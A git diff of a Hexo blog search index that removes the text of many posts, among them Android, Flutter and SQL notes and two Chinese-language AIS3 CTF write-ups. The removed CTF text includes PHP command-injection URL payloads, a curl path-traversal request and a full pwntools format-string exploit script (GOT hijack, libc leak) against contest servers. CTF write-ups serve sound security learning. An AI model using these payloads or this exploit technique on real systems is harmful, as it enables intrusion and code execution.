@@ -3,145 +3,7 @@
   <entry>
     <title>AIS3 2018 write-up</title>
     <url>/AIS3-2018-write-up/</url>
-    <content><![CDATA[今年第二次參加 AIS3 pre-exam 的感想
-
-要用到程式解的地方滿多的
-Web2 對網路環境不好的人會跑很久
-Misc2 超多假 flag，要找到真的根本要通靈＝＝
-
-
-Web
-1. warmup
-
-
-打開 開發者工具，可以看到 response headers 裡面有奇怪的 Partial-Flag
-
-
-
-再看看網址列上有奇怪的參數，嘗試去改改看它，會發現 partial flag 跟著變了
-
-
-
-再仔細觀察一下，發現前四個 partial flag 是 AIS3，所以可以知道 partial flag 組合起來就是這題的 flag 了。
-
-
-但這題 flag 有點長，所以我用 Python 來解
- import requestsfor i in range(50):    r = requests.get("http://104.199.235.135:31331/index.php?p=&#123;&#125;".format(i))    key = r.headers['Partial-Flag']    if key == '':        print(' ', end='')    else:        print(key, end='')
-
-
-2. hidden
-
-
-打開網頁就看到這行字
-
-
-
-因為看到上面顯示的文字，所以想到 secret page 可能藏在 robots.txt 裡
-
-
-
-進到 _hidden_flag_.php 頁面之後，發現還是沒有看到 flag。
-
-
-
-打開 開發者工具 查看 HTML，發現按鈕會送出奇怪的 form-data。
-
-
-
-按了幾次按鈕後，會發現 c 不斷的再增加， s 也跟著變
-
-
-
-透過 開發者工具 的看看 response，發現了奇怪的假 flag
-
-
-
-拿 Python 去跑跑看，跑到幾萬後會發現 response 的 Flag 變了，flag 就出來的
- import requestsfrom bs4 import BeautifulSouppayload = &#123;'c': "1", 's': '3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb'&#125;while True:    r = requests.post('http://104.199.235.135:31332/_hidden_flag_.php', payload)    soup = BeautifulSoup(r.content, "html.parser")    print(r.headers)    f = open('ans.txt', 'a')    f.write(str(r.headers)+"\n")    if 'AIS3&#123;NOT_A_VALID_FLAG&#125;' not in str(r.headers):        break    c = soup.find("input", &#123;"name":'c'&#125;)['value']    s = soup.find("input", &#123;"name":'s'&#125;)['value']    payload = &#123;'c': c, 's': s&#125;
-
-
-3. sushi
-這題查了一下資料，嘗試很多次，最後發現考的好像是 php double quote
-
-
-可以印出當前檔案目錄
- http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?🍣&#x3D;$&#123;@system(ls)&#125;
-
-
-
-因為這題 .htaccess 沒有限制，所以可以直接訪問 flag
- http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;flag_name_1s_t00_l0ng_QAQQQQQQ
-
-
-不過如果有限制，可以利用下面的解法來印出 flag
- http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?🍣&#x3D;&quot;.&#96;$_GET[1]&#96;.&quot;&amp;1&#x3D;cat flag_name_1s_t00_l0ng_QAQQQQQQ
-
-
-Reverse
-1. find
-這題只是將 flag 藏在檔案中，可以用記事本或是編輯器打開，用 ctrl+f 很快就能找到了。
-
-如果是用 linux 或 mac 有更快的解法
-
-
-3. crackme
-
-
-猜測這是用 .NET 寫的，所以用 dnSpy 來打開它
-
-
-在 MainWindow 中看到疑似 flag 的東西
-
-
-
-發現 secret 是用 XOR 加密然後轉成 int
-
-
-
-用 Python 來解
- #!/usr/bin/env python3list = [234, 226, 248, 152, 208, 154, 223, 244, 226, 158, 244, 238, 234, 216, 210, 244, 223, 228, 244, 232, 249, 159, 200, 192, 244, 230, 206, 138, 214]for i in list:    print(chr(i^171), end='')
-
-
-Misc
-1. welcome
-送分題，看影片拿 flag
-2. flags
-這題可以找到 3 個假 flag，要找到真 flag 根本要通靈＝＝
-
-
-用編輯器開他，會發現有假 flag 藏在其中
-
-
-將檔名改成 jpg，會看到圖片上面顯示著假 flag
-
-
-
-用 binwalk 去分析檔案，會發現其中藏著 zip
-
-
-
-用 dd 把其中的 zip 拆出來
- dd if=flags.jpg of=flag skip=48932 bs=1
-
-
-拆出來的 zip 有密碼，所以用 pkcrack 來破解
- pkcrack -c backup/Avengers_Infinity_War_Poster.jpg -p Avengers_Infinity_War_Poster.jpg -C flag.zip -P photo.zip
-
-
-破解完後拿到裡面的 flag 檔，發現還是假的＝＝
-
-
-最後透過主辦方給出的提示，回到第二步那張圖，盯了老半天，發現那個框框藏有摩斯密碼…
-
-
-
-Crypto
-1. POW
-這題考的就是 proof of work
-
-用 Python 暴力去運算比對是否符合條件 #!/usr/bin/env python3import itertoolsimport stringfrom hashlib import *from pwn import *r = remote('104.199.235.135', 20000)r.recvuntil("condition : x[:6] == '")cond = r.recvuntil("'").decode('ascii').rstrip("'")r.recvuntil('x = ')ans = ''alphanumeric = string.ascii_uppercase + string.ascii_lowercase + string.digitsfor s in itertools.product(alphanumeric, repeat=4):    if sha256(('%s%s'%(cond, ''.join(s))).encode('utf-8')).hexdigest().startswith('000000'):        ans = cond + ''.join(s)        breakr.sendline(ans)r.interactive()
-
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -152,21 +14,33 @@ Crypto
       </tags>
   </entry>
   <entry>
+    <title>Android Studio 技巧整理</title>
+    <url>/Android-Studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android Studio</tag>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AIS3 Final CTF - hellOwOrld</title>
+    <url>/AIS3-Final-CTF-hellOwOrld/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>AIS3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Android 學習問題紀錄</title>
     <url>/Android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</url>
-    <content><![CDATA[紀錄 1
-問題
-在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。
-
-原因
-OkHttp 不是執行在 UI Thread，但 Retrofit 是。
-紀錄 2
-問題
-在 OkHttp  的 onResponse 中使用 Toast 會噴錯。
-原因
-OkHttp 不是執行在 UI Thread。
-解法
-// 解法1Handler handler = new Handler(Looper.getMainLooper());handler.post(new Runnable() &#123;    @Override    public void run() &#123;        // TODO    &#125;&#125;);// 解法2activity.runOnUiThread(new Runnable() &#123;    @Override    public void run() &#123;            &#125;&#125;);]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -177,19 +51,7 @@ OkHttp 不是執行在 UI Thread。
   <entry>
     <title>Error：Fragment already added</title>
     <url>/Error-Fragment-already-added/</url>
-    <content><![CDATA[遇到狀況
-java.lang.IllegalStateException: Fragment already added
-
-
-原因
-Fragment 在一些狀況不會正常移除
-原本程式碼
-FragmentTransaction transaction = getFragmentManager().beginTransaction();transaction.replace(R.id.fragment_container, newFragment);transaction.addToBackStack(null);transaction.commit();
-解決辦法
-因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。
-if(mFragment.isAdded())&#123;     return; //or return false/true, based on where you are calling from&#125;
-後來程式碼
-FragmentTransaction transaction = getFragmentManager().beginTransaction();if (newFragment.isAdded()) &#123;    return;&#125;transaction.replace(R.id.fragment_container, newFragment);transaction.addToBackStack(null);transaction.commit();]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -200,232 +62,20 @@ FragmentTransaction transaction = getFragmentManager().beginTransaction();if (ne
       </tags>
   </entry>
   <entry>
-    <title>AIS3 Final CTF - hellOwOrld</title>
-    <url>/AIS3-Final-CTF-hellOwOrld/</url>
-    <content><![CDATA[我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ
-這邊整理了一些解題過程和思路，有興趣可以看一下～
-如果有任何其他思路也歡迎在下面提出！
-
-
-
-misc
-Painting bot/100
-
-This is an AI painting bot. Could you get the flag from the bot?
-(Please remember to back up important files in your system.)
-(Any loss caused by this program will not be covered by us.)
-http://ctf.ais3.org/files/misc1_artist.exe
-
-這是我原本看到題目後做的事
-查看檔案有沒有藏東西
-
-發現有HTML，因此用 dd 拆出來，打開後發現沒屁用
-
-
-沒頭緒
-
-
-其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ
-
-
-RPG/200
-
-Here is a secret RPGMaker XP game. Win the game and you will get the flag!
-If you don’t have rtp, please visit the site at
-https://sites.google.com/site/taiwanrpgplayer/rtp
-and download RPG Maker XP RTP.
-http://ctf.ais3.org/files/misc2_rpg.exe
-
-由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)
-
-首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來
-
-接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP
-開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 Generate Game.rxproj)，
-在 end 的場景左上角會發現一個被框起來的格子 (event)
-打開之後就會發現這一行：
-
-如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO
-
-Hat/300
-
-Every hacker has his/her own hat! Try to customize one for yourself!
-http://srv03.ctf.ais3.org:9001/
-
-
-聽說找到 .git 的資料夾可以還原兩個檔案
-
-pwn
-Baby format/100
-
-Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf’s!
-hint: printf has buffer, and you will only see the output after the buffer is full.
-hint2: maybe try GOT Hijack and return to main
-http://ctf.ais3.org/files/pwn1_fmt.7z
-service is on srv01.ctf.ais3.org:5521
-
-import sysfrom pwn import *host = 'srv01.ctf.ais3.org'port = 5521if len(sys.argv) &gt; 1:    r = remote(host, port)else:    r = process('./fmt')main = 0x400646start_main_offset = 0x21ab0 + 0xe7one_gadget = 0x10a38cputs = 0x601018def get_fmt_payload(value, target):    global num    num = num % 256    if value == num:        return ''    elif value &gt; num:        payload = '%' + str(value-num) + 'c' + target        num = value        return payload    else:        n = 256-num + value        num = value        return '%' + str(n) + 'c' + targetnum = 73payload = 'startLeak:%39$p:%41$p:%43$p:%69$p'payload += get_fmt_payload(0x46, '%32$hhn')payload += get_fmt_payload(0x06, '%33$hhn')payload += get_fmt_payload(0x40, '%34$hhn')payload += '%10000c'payload = payload.ljust(0xd0, '\x00')payload += p64(puts)payload += p64(puts+0x1)payload += p64(puts+0x2)r.sendline(payload)r.recvuntil('startLeak:')canary = int(r.recvuntil(':')[:-1], 16)libc = int(r.recvuntil(':')[:-1], 16) - start_main_offsetret_addr = int(r.recvuntil(':')[:-1], 16) - 0xe0print('libc:', hex(libc))print('canary:', hex(canary))print('ret_addr:', hex(ret_addr))gadget = libc+one_gadgetprint('gadget:', hex(gadget))num = 0payload = get_fmt_payload(gadget&amp;0xff, '%32$hhn')gadget = gadget &gt;&gt; 8payload += get_fmt_payload(gadget&amp;0xff, '%33$hhn')gadget = gadget &gt;&gt; 8payload += get_fmt_payload(gadget&amp;0xff, '%34$hhn')gadget = gadget &gt;&gt; 8payload += get_fmt_payload(gadget&amp;0xff, '%35$hhn')gadget = gadget &gt;&gt; 8payload += get_fmt_payload(gadget&amp;0xff, '%36$hhn')gadget = gadget &gt;&gt; 8payload += get_fmt_payload(gadget&amp;0xff, '%37$hhn')gadget = gadget &gt;&gt; 8payload = payload.ljust(0xd0, '\x00')payload += p64(puts)payload += p64(puts+0x1)payload += p64(puts+0x2)payload += p64(puts+0x3)payload += p64(puts+0x4)payload += p64(puts+0x5)payload += p64(puts+0x6)r.sendline(payload)r.interactive()
-
-web
-Secret message/100
-
-One secret person embeds a secret message in the website. Could you find the message?
-http://srv02.ctf.ais3.org:8887/
-
-
-potocol=GETi=0while [ $i -lt 100 ]; do		curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol &gt;&gt; flags.txt 	potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d ' ' | tr -d "\r")	echo &gt;&gt; flags.txt 	i=$[$i+1]done
-然後我用手拼起來…
-Flag
-AIS3&#123;HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!&#125;
-
-Reverse proxy/200
-
-Bob setup a simple reverse proxy, and configured some passwords.
-Unfortunately, he lost the password. Could you please help him to find it out?
-http://ctf.ais3.org/files/web2_main.py
-http://srv02.ctf.ais3.org:8787/
-
-這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究
-在程式中可以看到，編輯中
-curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST &gt; /dev/nullcurl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d 'QAQ'
-Flag
-AIS3&#123;f1aSk_pr0Xy_5Erver_15_N1Ce!!&#125;
-
-Invitation letter/300
-
-Customize your own invitation letter!
-http://srv03.ctf.ais3.org:9002/
-
-
-==還沒解完==
-robots.txt
-http://srv03.ctf.ais3.org:9002/robots.txt
-
-看起來是程式碼
-http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531
-無法存取的 flag.txt
-http://srv03.ctf.ais3.org:9002/files/flag.txt
-]]></content>
+    <title>Flutter: const vs final</title>
+    <url>/Flutter-const-vs-final/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>CTF</category>
+        <category>Flutter</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>AIS3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android Studio 技巧整理</title>
-    <url>/Android-Studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/</url>
-    <content><![CDATA[最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。
-
-Live Templates
-Live Templates：程式碼快速補全模板
-這邊列出一些比較常見的 Live Templates，有興趣的人可以自行深入了解。
-
-newInstance - 在 Fragment 中生成 newInstance 方法
-Toast - 生成 Toast.makeText(context, &quot;&quot;, Toast.LENGTH_SHORT).show();
-fbc - 生成 findViewById
-const - 定義一個 android style int 常數
-logd - 生成 Log.d(TAG, &quot;&quot;);
-logm - Log 當前方法名稱和參數
-logr - Log 當前方法結果
-logt - 當前類生成 log tag
-psf - public static final
-sout - 印出一個字串到 System.out
-soutm - 印出當前類名和方法到 System.out
-soutp - 印出方法參數和返回值到 System.out
-visible - 設置 view VISIBLE
-gone - 設置 view GONE
-noInstance - private 構造方法
-
-Android Studio 的自動生成
-可以使用 Android Studio 自動幫你生成一些程式碼
-
-&lt;expr&gt;.null 轉換成 if(&lt;expr&gt; == null)
-&lt;expr&gt;.notnull 轉換成 if(&lt;expr&gt; != null)
-&lt;expr&gt;.var 轉換成 T name = &lt;expr&gt;
-&lt;expr&gt;.field 會自動生成一個全局變數 field = &lt;expr&gt;
-&lt;ArrayExpr&gt;.for 轉換成 for(T item : &lt;Arrayexpr&gt;)
-&lt;ArrayExpr&gt;.fori 轉換成 for(int i = 0; i &lt; &lt;Arrayexpr&gt;.length; i++)
-&lt;ArrayExpr&gt;.forr 轉換成 for(int i = &lt;Arrayexpr&gt;.length - 1; i &gt; 0 ; i--)
-
-插件
-下面列出一些我正在使用的插件
-
-
-Android Drawable Importer
-為了適應所有 Android 螢幕的大小和密度，每個 Android 項目都會包含 drawable 資料夾。任何具備 Android 開發經驗的開發人員都知道，為了支持所有的螢幕尺寸，你必須給每個螢幕類型導入不同的 Drawalbe。Android Drawable Importer 插件能讓這項工作變得更容易。它可以減少導入縮放圖像到 Android 項目所需的工作量。 Android Drawable Importer 添加了一個在不同分辨率導入 Drawble 或縮放指定圖像到定義分辨率的選項。這個插件加速了開發人員的 Drawable 工作。
-
-
-Lifecycle Sorter
-可以根據 Activity 或者 fragment 的生命週期對其生命週期方法位置進行先後排序，快捷鍵 Ctrl + alt + K。
-
-
-.ignore
-我們都知道在 Git 中想要過濾掉一些不想提交的文件，可以把相應的文件添加到 .gitignore 中，而 .gitignore 這個 Android Studio 插件根據不同的語言來選擇模板，就不用自己在費事添加一些文件了，而且還有自動補全功能，過濾文件再也不要復製檔名了。我們做項目的時候，並不是所有文件都是要提交的，比如構建的 build 資料夾，本地配置文件，每個 Module 生成的 iml 文件，但是我們每次 add，commit 都會不小心把它們添加上去，而 gitignore 就是解決這種痛點的，如果你不想提交的檔案，就可以在創建項目的時候將這個檔案中添加即可，將一些通用的東西屏蔽掉。
-
-
-Android Methods Count
-統計 Android 依賴庫中方法的總個數。 (一個 dex 只能接受的 65K 並不是指方法數超過 65K 而報的錯,而是指引用計數超過 65K)
-
-
-jetbrains-wakatime
-紀錄在 Android Studio 上的工作時間。
-
-
-Genymotion
-好用的 Android 模擬器，原生模擬器不堪用。
-
-
-GsonFormat
-快速將 json 字串轉換成一個 Java Bean，免去我們根據 json 字符串手寫對應 Java Bean 的過程。
-
-
-LayoutFormatter
-一鍵幫你將你的 XML 文件排版，並調整順序。
-
-
-快捷鍵
-完整的快捷键指南
-參考資料
-
-nisrulz/android-tips-tricks
-Android Studio插件整理
-
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-        <tag>Android Studio</tag>
+        <tag>Flutter</tag>
       </tags>
   </entry>
   <entry>
     <title>Mac 下使用 Shadowsocks 翻牆</title>
     <url>/Mac%E4%B8%8B%E4%BD%BF%E7%94%A8Shadowsocks%E7%BF%BB%E7%89%86/</url>
-    <content><![CDATA[這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 翻牆 效果。
-
-下載 ShadowsocksX-NG
-GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/
-
-編輯代理伺服器
-點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences…】選項：
-
-新增 Shadowsocks 服務配置：
-
-更改代理模式
-預設模式為 Proxy Auto Configure Mode，這邊我們將它改為 Global Mode，使所有對外連線都使用 Shadowsocks，且無需特別設定。
-如要使用 Proxy Auto Configure Mode，會需要額外設定，這邊就不多做敘述。
-
-測試是否成功
-訪問 orange.tw 來查看自己的 IP 是否有變更。
-
-關閉 Shadowsocks
-點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。
-
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Shadowsocks</category>
       </categories>
@@ -436,266 +86,9 @@ GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/
       </tags>
   </entry>
   <entry>
-    <title>android:gravity 和 android:layout_gravity 的差別</title>
-    <url>/android-gravity%E5%92%8Candroid-layout-Gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</url>
-    <content><![CDATA[在 Android 介面設計中，常會用到  android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。
-
-android:gravity 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。
-android:layout_gravity 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Flutter: const vs final</title>
-    <url>/Flutter-const-vs-final/</url>
-    <content><![CDATA[Const
-
-需要在創建時就給定值，且會再編譯時期決定好，因此如果是執行時期才知道的值是不能用 const 的。
-const 裡的值也得要是 const，不能是在執行階段才知道或是可改變的值，因此下面的範例會失敗：const arr = [1, 2, 3]arr[1] = 11 // 執行失敗
-
-
-Final
-
-給定值之後就不能再更改，但可以在建構子之中再給。
-
-]]></content>
-      <categories>
-        <category>Flutter</category>
-      </categories>
-      <tags>
-        <tag>Flutter</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL 語法筆記</title>
     <url>/SQL-tutorial/</url>
-    <content><![CDATA[基本語法
-創建資料表
-CREATE TABLE
-CREATE TABLE table_name (   column_1 data_type,    column_2 data_type,    column_3 data_type);
-CREATE TABLE celebs (    id INTEGER,    name TEXT,     age INTEGER);
-CREATE TABLE celebs (   id INTEGER PRIMARY KEY,    name TEXT UNIQUE,   date_of_birth TEXT NOT NULL,   date_of_death TEXT DEFAULT 'Not Applicable',);
-
-
-PRIMARY KEY：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 PRIMARY KEY。
-
-
-UNIQUE：與 PRIMARY KEY 很像，不過它可以設置在一個資料的多個欄位
-
-
-NOT NULL：強制該欄位一定要給定值
-
-
-DEFAULT：如果欄位沒有值，會自動定預設值
-
-
-
-刪除資料表
-DROP DATABASE
-DROP DATABASE table_name;
-新增資料
-INSERT INTO
-INSERT INTO table_name (id, name, age)VALUES (1, 'Justin Bieber', 21);SELECT * FROM table_name;
-資料表查詢
-SELECT
-SELECT column_name FROM table_name;
-SELECT * FROM table_name;
-更新資料
-UPDATE
-UPDATE celebsSET age = 22WHERE id = 1;
-改變資料表欄位
-ALTER TABLE
-
-新增欄位  ALTER TABLE celebs ADD COLUMN twitter_handle TEXT;
-
-刪除欄位  ALTER TABLE celebsDROP COLUMN twitter_handle;
-
-修改欄位
-
-SQL Server / MS Access  ALTER TABLE celebsALTER COLUMN twitter_handle INTEGER;
-
-My SQL / Oracle (prior version 10G)  ALTER TABLE celebsMODIFY COLUMN twitter_handle INTEGER;
-
-Oracle 10G and later  ALTER TABLE celebsMODIFY twitter_handle INTEGER;
-
-
-
-
-刪除資料
-DELETE FROM
-DELETE FROM celebsWHERE twitter_handle IS NULL;
-進階查詢語法
-SELECT
-查詢結果顯示 name, genre, year
-SELECT name, genre, yearFROM movies;
-AS
-可以改變查詢結果的欄位名稱，但不會改掉資料表裡的欄位
-SELECT imdb_rating AS 'IMDb' FROM movies;
-SELECT DISTINCT
-去掉的重複的查詢結果
-
-去掉 year 重複的結果
-
-SELECT DISTINCT yearFROM movies;
-
-去掉 year 和 name 都重複的結果
-
-SELECT DISTINCT year, nameFROM movies;
-WHERE
-篩選資料用的
-SELECT *FROM moviesWHERE year &gt; 2014;
-
-
-
-運算子
-作用
-
-
-
-
-=
-等於
-
-
-!=
-不等於
-
-
-&gt;
-大於
-
-
-&lt;
-小於
-
-
-&gt;=
-大於等於
-
-
-&lt;=
-小於等於
-
-
-
-:::danger
-「等於」要特別注意，只有一個等號
-:::
-LIKE
-可以在 WHERE 子句中使用 LIKE 運算子來進行模糊搜尋
-SELECT *FROM moviesWHERE name LIKE 'Se_en';
-:::info
-_ 代表任意字元
-:::
-SELECT * FROM moviesWHERE name LIKE 'A%';
-
-A% 代表由 A 開頭
-%A 代表由 A 結尾
-%man% 代表所有含有 man 的字串
-
-NULL
-NULL 不能拿來用運算子進行比較，因此出現 IS NULL、IS NOT NULL 來判斷是否是 NULL。
-
-顯示具有 imdb_rating 的資料
-
-SELECT nameFROM movies WHERE imdb_rating IS NOT NULL;
-BETWEEN
-可以在 WHERE 子句中使用 BETWEEN 運算子來篩選出特定範圍區間得值
-篩選出 name 開頭為 ‘A’、‘B’、‘C’ 的結果
-SELECT *FROM moviesWHERE name BETWEEN 'A' AND 'D';
-篩選出 year 在 1990 ~ 1999 區間的結果
-SELECT *FROM moviesWHERE year BETWEEN 1990 AND 1999;
-:::warning
-BETWEEN 兩個字串，會不包含結尾
-BETWEEN 兩個數字，會包含結尾的數字
-:::
-AND
-SELECT * FROM moviesWHERE year BETWEEN 1990 AND 1999   AND genre = 'romance';
-
-OR
-SELECT *FROM moviesWHERE genre = 'romance'	OR genre = 'comedy';
-
-ORDER BY
-用來排序結果
-:::warning
-如果 WHERE 存在，ORDER BY 永遠跟在 WHERE 後面
-:::
-
-DESC：從大道小排序
-ASC：從小到大排序（預設）
-
-LIMIT
-用來限制查詢結果數量
-SELECT *FROM moviesORDER BY imdb_rating DESCLIMIT 3;
-:::warning
-永遠放在查訊語法最後面
-:::
-:::info
-不是所有 RDBMS（關聯式資料庫管理系統） 都有
-:::
-CASE
-SQL 中的判斷式，可以用在顯示結果加上新欄位
-:::info
-CASE 通常在 SELECT 語句中
-:::
-
-WHEN 後面接著條件式，如果條件式為真，會返回 THEN 後面的字串
-ELSE 會在前面條件式都不符合的時候，返回一個字串
-CASE 結尾一定要有一個 END
-可以在 END 後面接 AS 來簡稱該條件的欄位名稱
-
-SELECT name,    CASE        WHEN genre = 'romance' THEN 'Chill'        WHEN genre = 'comedy' THEN 'Chill'        ELSE 'Intense'    END AS 'Mood'FROM movies;
-計算函式
-Count
-計算指定欄位非空資料的總數
-SELECT COUNT(*) FROM fake_appsWHERE price = 0;
-SUM
-加總指定欄位的值
-SELECT SUM(downloads)FROM fake_apps;
-MAX / MIN
-求指定欄位的最大或最小值
-SELECT MIN(downloads)FROM fake_apps;
-AVERAGE
-求指定欄位的平均值
-SELECT AVG(price)FROM fake_apps;
-ROUND
-將指定資料四捨五入
-SELECT ROUND(AVG(price), 2)FROM fake_apps;
-彙總函式
-GROUP BY
-用來搭配 SELECT 語句，將指定欄位中，相同資料的放在一組，以便計算函式以組為單位進行計算
-:::info
-GROUP BY 會出現在 WHERE 之後，ORDER BY 和 LIMIT 之前
-:::
-SELECT category, SUM(downloads) FROM fake_appsGROUP BY category;
-GROUP BY 後面的參數可以接數字，從 1 開始，分別代表 SELECT 後面的第幾個值
-SELECT category,    price,   AVG(downloads)FROM fake_appsGROUP BY 1, 2;
-以上面的例子來說，GROUP BY 後面的 1、2 分別指向 category 和 price
-HAVING
-與 WHERE 類似，不過他是針對 Group
-:::info
-HAVING 會出現在 GROUP BY 之後，ORDER BY 和 LIMIT 之前
-:::
-SELECT price,    ROUND(AVG(downloads)),   COUNT(*)FROM fake_appsGROUP BY priceHAVING COUNT(*) &gt; 10;
-表格連接
-JOIN
-使用方法：JOIN 表格名稱 ON 連接欄位規則
-
-連接後會自動補 NULL
-
-SELECT *FROM ordersJOIN customers  ON orders.customer_id = customers.customer_id;
-INNER JOIN
-使用方法：INNER JOIN 表格名稱 ON 連接欄位規則
-
-會自動將不符合連接欄位規則的部分捨棄，如下圖
-
-
-SELECT COUNT(*)FROM newspaperJOIN onlineON newspaper.id = online.id;]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>SQL</category>
       </categories>
@@ -707,21 +100,7 @@ SELECT COUNT(*)FROM newspaperJOIN onlineON newspaper.id = online.id;]]></content
   <entry>
     <title>getColor(int id) deprecated</title>
     <url>/getcolor-deprecated/</url>
-    <content><![CDATA[從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。
-
-新方法：
-context.getColor(id);
-如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：
-ContextCompat.getColor(context, R.color.your_color);
-此方法來自官方 JavaDoc 的描述：
-Returns a color associated with a particular resource ID
-
-Starting in M, the returned color will be styled for the specified Context's theme.
-
-這是 ContextCompat.getColor() 的程式碼：
-public static final int getColor(Context context, @ColorRes int id) &#123;    if (Build.VERSION.SDK_INT &gt;= 23) &#123;        return context.getColor(id);    &#125; else &#123;        return context.getResources().getColor(id);    &#125;&#125;
-如果不想導入 Support Library v4，可以直接參考上面的寫法。
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -731,421 +110,58 @@ public static final int getColor(Context context, @ColorRes int id) &#123;    if
       </tags>
   </entry>
   <entry>
-    <title>如何在 Centos 7 創建一個 Sudo user</title>
-    <url>/how-to-create-a-sudo-user-on-centos-quickstart/</url>
-    <content><![CDATA[
-以 root 身份登錄到你的伺服器。 ssh root@server_ip_address
-
-
-
-
-
-使用 adduser 指令將新用戶添加到你的系統
-將 username 替換為你要創建的用戶
- adduser username
-
-使用 passwd 指令更新 user 密碼
-
- passwd username
-
-設置 user 的密碼的顯示訊息
-
- Set password prompts:Changing password for user username.New password:Retype new password:passwd: all authentication tokens updated successfully.
-
-
-使用 usermod 指令將用戶添加到 wheel 中。
- usermod -aG wheel username
-默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。
-
-
-在 user 上測試 sudo 訪問權限
-
-使用該 su 命令切換到新的 user 。
-
- su - username
-
-作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。
-
-例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。
- sudo ls -la /
-
-第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。
-
- Output:[sudo] password for username:
-如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。
-
-
-]]></content>
+    <title>android:gravity 和 android:layout_gravity 的差別</title>
+    <url>/android-gravity%E5%92%8Candroid-layout-Gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>Linux</category>
+        <category>Android</category>
       </categories>
       <tags>
-        <tag>CentOS</tag>
-        <tag>Linux</tag>
-        <tag>教學</tag>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
     <title>Hexo+GitHub，新手也可以快速建立部落格</title>
     <url>/hexo-tutorial/</url>
-    <content><![CDATA[之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。
-
-Hexo 優點
-
-因為建立於本地端，所以可以更方便離線進行編輯
-可以不需要一台伺服器
-文章編輯使用 Markdown 語法，更方便、通用、容易上手
-部署於 GitHub 上，完全零成本
-中文兼容性高
-可快速搭建優質的部落格
-
-開始之前
-建議先了解，cmd 或是 bash 指令
-之後所有指令以 ‘$’ 開頭，皆為 bash 指令
-​
-有任何問題，都歡迎留言詢問唷～
-建制步驟
-安裝 Node.js
-去 Node.js 官網下載安裝
-安裝 Hexo Git
-$ npm install hexo-deployer-git --save
-安裝 Hexo
